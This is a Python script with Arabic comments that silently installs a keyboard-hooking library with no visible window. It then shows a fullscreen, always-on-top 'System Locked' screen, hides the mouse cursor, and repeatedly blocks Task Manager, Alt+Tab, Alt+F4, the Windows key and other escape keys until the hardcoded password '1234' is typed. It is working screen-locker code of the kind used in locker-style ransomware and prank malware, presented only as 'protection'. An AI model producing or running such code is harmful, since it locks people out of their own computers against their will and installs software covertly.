import subprocess
import sys
import os
import threading
import time
import ctypes

# =============================================================
# مرحلة التثبيت الصامت (بدون أي تدخل بشري أو نوافذ ظاهرة)
# =============================================================
def auto_setup():
    try:
        import keyboard
    except ImportError:
        # CREATE_NO_WINDOW = 0x08000000 لمنع ظهور نافذة CMD نهائياً
        # sys.executable يضمن استخدام نفس نسخة بايثون المشغلة
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "keyboard"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000
        )

# تنفيذ التثبيت التلقائي فوراً
auto_setup()

# الآن يمكن استيراد المكتبات بأمان
import tkinter as tk
from tkinter import messagebox
import keyboard

# =============================================================
# إعدادات النظام والتوافق
# =============================================================
try:
    # لتحسين دقة الشاشة والخطوط في ويندوز 7 وما فوق
    ctypes.windll.shcore.SetProcessDpiAwareness(1)
except:
    try: ctypes.windll.user32.SetProcessDPIAware()
    except: pass

PASSWORD = "1234"

def check_password():
    if password_entry.get() == PASSWORD:
        try:
            ctypes.windll.user32.ShowCursor(True)
            keyboard.unhook_all()
        except:
            pass
        root.destroy()
        os._exit(0)
    else:
        messagebox.showerror("خطأ", "كلمة السر خاطئة!")
        password_entry.delete(0, tk.END)
        password_entry.focus()

def protection_loop():
    """حلقة حماية لتعطيل المفاتيح وضمان التركيز"""
    keys = ['win', 'alt+tab', 'alt+f4', 'ctrl+shift+esc', 'ctrl+esc', 'escape', 'tab', 'f11']
    while True:
        # حظر المفاتيح
        for key in keys:
            try: keyboard.block_key(key)
            except: pass
        
        # إجبار النافذة على البقاء في المقدمة
        try:
            root.attributes("-topmost", True)
            root.focus_force()
            if not root.attributes("-fullscreen"):
                root.attributes("-fullscreen", True)
        except:
            pass
        
        time.sleep(0.5)

# =============================================================
# واجهة المستخدم (تعديل الألوان لتناسب جميع الأنظمة)
# =============================================================
root = tk.Tk()
root.title("System Locked")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.configure(bg='#8b0000') # أحمر داكن احترافي
root.protocol("WM_DELETE_WINDOW", lambda: None)

# حاوية المركز
main_frame = tk.Frame(root, bg='#8b0000')
main_frame.place(relx=0.5, rely=0.5, anchor='center')

tk.Label(main_frame, text="⚠️ تم قفل الوصول للنظام ⚠️", 
         font=("Arial", 32, "bold"), fg="white", bg='#8b0000').pack(pady=30)

tk.Label(main_frame, text="أدخل الرمز لفتح الجهاز:", 
         font=("Arial", 18), fg="#ecf0f1", bg='#8b0000').pack()

password_entry = tk.Entry(main_frame, show="●", font=("Arial", 28), 
                          width=15, justify='center', bg='white', fg='black')
password_entry.pack(pady=20)
password_entry.focus()

unlock_btn = tk.Button(main_frame, text="فـتـح الـجـهـاز", font=("Arial", 16, "bold"),
                       bg="#27ae60", fg="white", width=25, height=2, 
                       relief='flat', command=check_password)
unlock_btn.pack(pady=20)

root.bind('<Return>', lambda e: check_password())

# =============================================================
# تشغيل الحماية
# =============================================================
try:
    ctypes.windll.user32.ShowCursor(False) # إخفاء الماوس
except:
    pass

# تشغيل خيط الحماية (Thread)
monitor_thread = threading.Thread(target=protection_loop, daemon=True)
monitor_thread.start()

root.mainloop()
